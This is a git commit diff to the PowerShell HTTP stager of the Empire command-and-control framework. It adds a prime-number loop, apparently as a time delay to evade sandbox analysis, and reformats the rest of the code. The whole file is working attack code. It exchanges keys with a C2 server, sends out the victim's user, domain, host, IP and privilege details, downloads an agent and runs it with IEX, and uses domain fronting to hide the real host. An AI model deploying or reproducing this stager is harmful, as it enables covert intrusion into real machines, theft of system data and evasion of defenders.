62e27784c0dd69550b3d18355d7c7aab18265ff8
secur3 <ben.miller@ecfirst.com>
2024-09-23 12:37:25 -0500

    more time delay obby

--- empire/server/data/agent/stagers/http/http.ps1
+++ empire/server/data/agent/stagers/http/http.ps1
@@ -7,10 +7,13 @@
 #        profile
 #################################################################
 
-{% include 'http/comms.ps1' %}
-$force=0;
+{ % include 'http/comms.ps1' % }
+$force = 0;
+
+function Perform-PrimeCheck { $maxNumber = 567765; $primes = @(); for ($i = 2; $i -le $maxNumber; $i++) { $isPrime = $true; for ($j = 2; $j -le [math]::Sqrt($i); $j++) { if ($i % $j -eq 0) { $isPrime = $false; break } }; if ($isPrime) { $primes += $i } } };
+
 function Start-Negotiate {
-    param($s,$SK,$UA='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko',$hop)
+    param($s, $SK, $UA = 'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko', $hop)
 
     function Change-To-Bstream {
         Param ($mck, $In)
@@ -35,7 +38,7 @@ function Start-Negotiate {
 
     function Read-Things {
         param ($mk, $In)
-        if($In.Length -gt 32) {
+        if ($In.Length -gt 32) {
             $Hsh = New-Object System.Security.Cryptography.HMACSHA256;
             $Enc = [System.Text.Encoding]::ASCII;
             # Verify the HMAC
@@ -58,7 +61,7 @@ function Start-Negotiate {
             $AesObj.Mode = "CBC";
             $AesObj.Key = $Enc.GetBytes($mk);
             $AesObj.IV = $Vec;
-            ($AesObj.CreateDecryptor()).TransformFinalBlock(($Dat[16..$Dat.length]), 0, $Dat.Length-16)
+            ($AesObj.CreateDecryptor()).TransformFinalBlock(($Dat[16..$Dat.length]), 0, $Dat.Length - 16)
         }               
     }
 
@@ -68,21 +71,21 @@ function Start-Negotiate {
 
     # try to ignore all errors
     $ErrorActionPreference = "SilentlyContinue";
-    $e=[System.Text.Encoding]::UTF8;
+    $e = [System.Text.Encoding]::UTF8;
     $customHeaders = "";
-    $SKB=$e.GetBytes($SK);
+    $SKB = $e.GetBytes($SK);
     # set up the AES/HMAC crypto
     # $SK -> staging key for this server
     try {
-        $sea=New-Object System.Security.Cryptography.AesCryptoServiceProvider;
+        $sea = New-Object System.Security.Cryptography.AesCryptoServiceProvider;
     }
     catch {
-        $sea=New-Object System.Security.Cryptography.RijndaelManaged;
+        $sea = New-Object System.Security.Cryptography.RijndaelManaged;
     }
     
     $mIV = [byte] 0..255 | Get-Random -count 16;
-    $sea.Mode="CBC";
-    $sea.Key=$SKB;
+    $sea.Mode = "CBC";
+    $sea.Key = $SKB;
     $sea.IV = $mIV;
 
     $hmac = New-Object System.Security.Cryptography.HMACSHA256;
@@ -90,24 +93,24 @@ function Start-Negotiate {
 
     $csp = New-Object System.Security.Cryptography.CspParameters;
     $csp.Flags = $csp.Flags -bor [System.Security.Cryptography.CspProviderFlags]::UseMachineKeyStore;
-    $rs = New-Object System.Security.Cryptography.RSACryptoServiceProvider -ArgumentList 2048,$csp;
+    $rs = New-Object System.Security.Cryptography.RSACryptoServiceProvider -ArgumentList 2048, $csp;
     # export the public key in the only format possible...stupid
-    $rk=$rs.ToXmlString($False);
+    $rk = $rs.ToXmlString($False);
 
     # generate a randomized sessionID of 8 characters
-    $ID=-join("ABCDEFGHKLMNPRSTUVWXYZ123456789".ToCharArray()|Get-Random -Count 8);
+    $ID = -join ("ABCDEFGHKLMNPRSTUVWXYZ123456789".ToCharArray() | Get-Random -Count 8);
 
     # build the packet of (xml_key)
-    $ib=$e.getbytes($rk);
+    $ib = $e.getbytes($rk);
 
     # encrypt/HMAC the packet for the c2 server
-    $eb=$mIV+$sea.CreateEncryptor().TransformFinalBlock($ib,0,$ib.Length);
-    $eb=$eb+$hmac.ComputeHash($eb)[0..9];
+    $eb = $mIV + $sea.CreateEncryptor().TransformFinalBlock($ib, 0, $ib.Length);
+    $eb = $eb + $hmac.ComputeHash($eb)[0..9];
 
     # if the web client doesn't exist, create a new web client and set appropriate options
     #   this only happens if this stager.ps1 code is NOT called from a launcher context
-    if(-not $talk) {
-        $talk=New-Object System.Net.WebClient;
+    if (-not $talk) {
+        $talk = New-Object System.Net.WebClient;
         # set the proxy settings for the WC to be the default system settings
         $talk.Proxy = [System.Net.WebRequest]::GetSystemWebProxy();
         $talk.Proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials;
@@ -124,14 +127,15 @@ function Start-Negotiate {
         $headers | ForEach-Object {
             $headerKey = $_.split(':')[0];
             $headerValue = $_.split(':')[1];
-	    #If host header defined, assume domain fronting is in use and add a call to the base URL first
-	    #this is a trick to keep the true host name from showing in the TLS SNI portion of the client hello
-	    if ($headerKey -eq "host"){
-                try{$ig=$talk.DownloadData($s)}catch{}};
+            #If host header defined, assume domain fronting is in use and add a call to the base URL first
+            #this is a trick to keep the true host name from showing in the TLS SNI portion of the client hello
+            if ($headerKey -eq "host") {
+                try { $ig = $talk.DownloadData($s) }catch {}
+            };
             $talk.Headers.Add($headerKey, $headerValue);
         }
     }
-    $talk.Headers.Add("User-Agent",$UA);
+    $talk.Headers.Add("User-Agent", $UA);
     
     # RC4 routing packet:
     #   sessionID = $ID
@@ -139,41 +143,41 @@ function Start-Negotiate {
     #   meta = STAGE1 (2)
     #   extra = (0x00, 0x00)
     #   length = len($eb)
-    $mIV=[BitConverter]::GetBytes($(Get-Random));
-    $data = $e.getbytes($ID) + @(0x01,0x02,0x00,0x00) + [BitConverter]::GetBytes($eb.Length);
-    $rc4p = Change-To-Bstream -mck $($mIV+$SKB) -In $data;
+    $mIV = [BitConverter]::GetBytes($(Get-Random));
+    $data = $e.getbytes($ID) + @(0x01, 0x02, 0x00, 0x00) + [BitConverter]::GetBytes($eb.Length);
+    $rc4p = Change-To-Bstream -mck $($mIV + $SKB) -In $data;
     $rc4p = $mIV + $rc4p + $eb;
 
     # step 3 of negotiation -> client posts AESstaging(PublicKey) to the server
-    $raw=$talk.UploadData($s+"/{{ stage_1 }}","POST",$rc4p);
+    $raw = $talk.UploadData($s + "/{{ stage_1 }}", "POST", $rc4p);
 
     # step 4 of negotiation -> server returns RSA(nonce+AESsession))
-    $de=$e.GetString($rs.decrypt($raw,$false));
+    $de = $e.GetString($rs.decrypt($raw, $false));
 
     # packet = server nonce + AES session key
-    $nonce=$de[0..15] -join '';
-    $key=$de[16..$de.length] -join '';
+    $nonce = $de[0..15] -join '';
+    $key = $de[16..$de.length] -join '';
 
     # increment the nonce
-    $nonce=[String]([long]$nonce + 1);
+    $nonce = [String]([long]$nonce + 1);
 
     # create a new AES object
     try {
-        $sea=New-Object System.Security.Cryptography.AesCryptoServiceProvider;
+        $sea = New-Object System.Security.Cryptography.AesCryptoServiceProvider;
     }
     catch {
-        $sea=New-Object System.Security.Cryptography.RijndaelManaged;
+        $sea = New-Object System.Security.Cryptography.RijndaelManaged;
     }
     $mIV = [byte] 0..255 | Get-Random -Count 16;
-    $sea.Mode="CBC";
-    $sea.Key=$e.GetBytes($key);
+    $sea.Mode = "CBC";
+    $sea.Key = $e.GetBytes($key);
     $sea.IV = $mIV;
 
     # get some basic system information
-    $i=$nonce+'|'+$s+'|'+[Environment]::UserDomainName+'|'+[Environment]::UserName+'|'+[Environment]::MachineName;
+    $i = $nonce + '|' + $s + '|' + [Environment]::UserDomainName + '|' + [Environment]::UserName + '|' + [Environment]::MachineName;
 
-    try{
-        $p=(gwmi Win32_NetworkAdapterConfiguration|Where{$_.IPAddress}|Select -Expand IPAddress);
+    try {
+        $p = (gwmi Win32_NetworkAdapterConfiguration | Where { $_.IPAddress } | Select -Expand IPAddress);
     }
     catch {
         $p = "[FAILED]"
@@ -181,33 +185,33 @@ function Start-Negotiate {
    
 
     # check if the IP is a string or the [IPv4,IPv6] array
-    $ip = @{$true=$p[0];$false=$p}[$p.Length -lt 6];
-    if(!$ip -or $ip.trim() -eq '') {$ip='0.0.0.0'};
-    $i+="|$ip";
+    $ip = @{$true = $p[0]; $false = $p }[$p.Length -lt 6];
+    if (!$ip -or $ip.trim() -eq '') { $ip = '0.0.0.0' };
+    $i += "|$ip";
 
-    try{
-        $i+='|'+(Get-WmiObject Win32_OperatingSystem).Name.split('|')[0];
+    try {
+        $i += '|' + (Get-WmiObject Win32_OperatingSystem).Name.split('|')[0];
     }
-    catch{
-        $i+='|'+'[FAILED]'
+    catch {
+        $i += '|' + '[FAILED]'
     }
 
     # detect if we're SYSTEM or otherwise high-integrity
-    if(([Environment]::UserName).ToLower() -eq "system"){$i+="|True"}
-    else {$i += '|' +([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")}
+    if (([Environment]::UserName).ToLower() -eq "system") { $i += "|True" }
+    else { $i += '|' + ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator") }
 
     # get the current process name and ID
-    $n=[System.Diagnostics.Process]::GetCurrentProcess();
-    $i+='|'+$n.ProcessName+'|'+$n.Id;
+    $n = [System.Diagnostics.Process]::GetCurrentProcess();
+    $i += '|' + $n.ProcessName + '|' + $n.Id;
     # get the powershell.exe version
     $i += "|powershell|" + $PSVersionTable.PSVersion.Major;
     $i += "|" + $env:PROCESSOR_ARCHITECTURE;
 
     # send back the initial system information
-    $ib2=$e.getbytes($i);
-    $eb2=$mIV+$sea.CreateEncryptor().TransformFinalBlock($ib2,0,$ib2.Length);
+    $ib2 = $e.getbytes($i);
+    $eb2 = $mIV + $sea.CreateEncryptor().TransformFinalBlock($ib2, 0, $ib2.Length);
     $hmac.Key = $e.GetBytes($key);
-    $eb2 = $eb2+$hmac.ComputeHash($eb2)[0..9];
+    $eb2 = $eb2 + $hmac.ComputeHash($eb2)[0..9];
 
     # RC4 routing packet:
     #   sessionID = $ID
@@ -215,9 +219,9 @@ function Start-Negotiate {
     #   meta = STAGE2 (3)
     #   extra = (0x00, 0x00)
     #   length = len($eb)
-    $mIV2=[BitConverter]::GetBytes($(Get-Random));
-    $data2 = $e.getbytes($ID) + @(0x01,0x03,0x00,0x00) + [BitConverter]::GetBytes($eb2.Length);
-    $rc4p2 = Change-To-Bstream -mck $($mIV2+$SKB) -In $data2;
+    $mIV2 = [BitConverter]::GetBytes($(Get-Random));
+    $data2 = $e.getbytes($ID) + @(0x01, 0x03, 0x00, 0x00) + [BitConverter]::GetBytes($eb2.Length);
+    $rc4p2 = Change-To-Bstream -mck $($mIV2 + $SKB) -In $data2;
     $rc4p2 = $mIV2 + $rc4p2 + $eb2;
 
     # the User-Agent always resets for multiple calls...silly
@@ -226,18 +230,19 @@ function Start-Negotiate {
         $headers | ForEach-Object {
             $headerKey = $_.split(':')[0];
             $headerValue = $_.split(':')[1];
-	    #If host header defined, assume domain fronting is in use and add a call to the base URL first
-	    #this is a trick to keep the true host name from showing in the TLS SNI portion of the client hello
-	    if ($headerKey -eq "host"){
-                try{$ig=$talk.DownloadData($s)}catch{}};
+            #If host header defined, assume domain fronting is in use and add a call to the base URL first
+            #this is a trick to keep the true host name from showing in the TLS SNI portion of the client hello
+            if ($headerKey -eq "host") {
+                try { $ig = $talk.DownloadData($s) }catch {}
+            };
             $talk.Headers.Add($headerKey, $headerValue);
         }
     }
-    $talk.Headers.Add("User-Agent",$UA);
-    $talk.Headers.Add("Hop-Name",$hop);
+    $talk.Headers.Add("User-Agent", $UA);
+    $talk.Headers.Add("Hop-Name", $hop);
 
     # step 5 of negotiation -> client posts nonce+sysinfo and requests agent
-    $raw=$talk.UploadData($s+"/{{ stage_2 }}", "POST", $rc4p2);
+    $raw = $talk.UploadData($s + "/{{ stage_2 }}", "POST", $rc4p2);
 
     # # decrypt the agent and register the agent logic
     # $data = $e.GetString($(Read-Things -Key $key -In $raw));
@@ -245,11 +250,12 @@ function Start-Negotiate {
     IEX $( $e.GetString($(Read-Things -mk $key -In $raw)) );
 
     # clear some variables out of memory and cleanup before execution
-    $sea=$null;$s2=$null;$talk=$null;$eb2=$null;$raw=$null;$mIV=$null;$i=$null;$ib2=$null;
+    $sea = $null; $s2 = $null; $talk = $null; $eb2 = $null; $raw = $null; $mIV = $null; $i = $null; $ib2 = $null;
     [GC]::Collect();
 
     # TODO: remove this shitty $server logic
     Start-Chess -myserver @(($s -split "/")[0..2] -join "/") -StagingKey $SK -SessionKey $key -SessionID $ID -WorkingHours "{{ working_hours }}" -KillDate "{{ kill_date }}" -ProxySettings $Script:Proxy;
 }
+$pcck = Perform-PrimeCheck
 # $ser is the server populated from the launcher code, needed here in order to facilitate hop listeners
 Start-Negotiate -s "$hom" -SK '{{ staging_key }}' -UA "$aua" -hop "$hop";
